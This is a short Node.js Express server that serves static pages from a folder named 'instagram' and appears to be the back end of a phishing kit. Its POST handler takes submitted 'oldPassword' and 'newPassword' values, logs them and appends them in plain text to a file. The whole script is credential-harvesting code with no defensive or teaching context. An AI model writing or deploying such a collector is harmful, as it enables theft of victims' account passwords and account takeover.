const fs = require('fs');
const express = require('express');
const cors = require('cors');
const app = express();

app.use(express.json({ extended: false }));
app.use(cors())
app.use(express.static('instagram'))
app.post('/', (req, res) => {
  console.log(req.body)
  const { oldPassword, newPassword } = req.body;
  const data = `Old password: ${oldPassword}, New password: ${newPassword} \n`
  fs.appendFile('text.txt', data, (err) => {
  if (err) throw err;
  res.send('The file has been saved!');
});
});

app.listen(80, () => {
  console.log('Server started');
});
